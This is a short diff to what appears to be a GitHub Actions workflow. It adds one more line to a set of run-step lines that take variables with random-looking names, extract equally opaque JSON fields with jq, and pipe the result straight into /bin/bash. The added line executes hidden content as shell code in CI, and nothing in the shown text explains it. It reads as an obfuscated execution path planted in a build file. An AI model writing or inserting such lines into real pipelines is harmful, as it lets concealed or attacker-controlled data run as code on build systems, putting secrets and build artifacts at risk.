@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$o47" | jq -r .ptmw1 | /bin/bash
           printf '%s' "$lbad49" | jq -r .sf3824 | /bin/bash
           echo $s41 | jq -r .yagl30070 | /bin/bash
+          echo $fi7860 | jq -r .yaqm576 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
